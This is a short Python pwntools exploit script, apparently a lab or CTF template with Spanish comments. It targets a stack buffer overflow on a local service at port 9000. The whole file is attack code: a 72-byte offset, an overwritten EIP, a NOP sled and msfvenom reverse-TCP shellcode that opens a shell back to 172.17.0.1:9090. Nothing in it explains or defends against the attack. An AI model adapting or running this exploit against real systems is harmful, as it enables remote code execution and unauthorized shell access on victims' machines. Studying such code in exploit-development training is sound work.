#!/usr/bin/env python3

from pwn import *

def exploit():

    ip='127.0.0.1'
    port='9000'

    # Offset
    offset = 72 # lo modificas

    # Buffer
    buffer = b"A"*offset

    # EIP
    eip = p32(0x761676b) # lo modificas

    # NOps
    nops = b"\x90"*32

    # Shellcode
    # msfvenom -p linux/x86/shell_reverse_tcp lhost='172.17.0.1' lport='9090' -b "\x00\xff\x0a\x0d" -f py -v shellcode
  
    shellcode =  b""
    shellcode += b"\xda\xc8\xba\xf6\x2a\x66\x39\xd9\x74\x24\xf4"
    shellcode += b"\x5b\x2b\xc9\xb1\x12\x31\x53\x17\x83\xc3\x04"
    shellcode += b"\x03\xa5\x39\x84\xcc\x78\xe5\xbf\xcc\x29\x5a"
    shellcode += b"\x13\x79\xcf\xd5\x72\xcd\xa9\x28\xf4\xbd\x6c"
    shellcode += b"\x03\xca\x0c\x0e\x2a\x4c\x76\x66\x01\xbf\x88"
    shellcode += b"\x77\x31\xc2\x88\x54\x43\x4b\x69\x2a\x25\x1c"
    shellcode += b"\x3b\x19\x19\x9f\x32\x7c\x90\x20\x16\x16\x45"
    shellcode += b"\x0e\xe4\x8e\xf1\x7f\x25\x2c\x6b\x09\xda\xe2"
    shellcode += b"\x38\x80\xfc\xb2\xb4\x5f\x7e"


    payload = buffer + eip + nops + shellcode


    conectar = remote(ip, port)
    conectar.sendline(payload)
    conectar.close

if __name__ == "__main__":
    exploit()
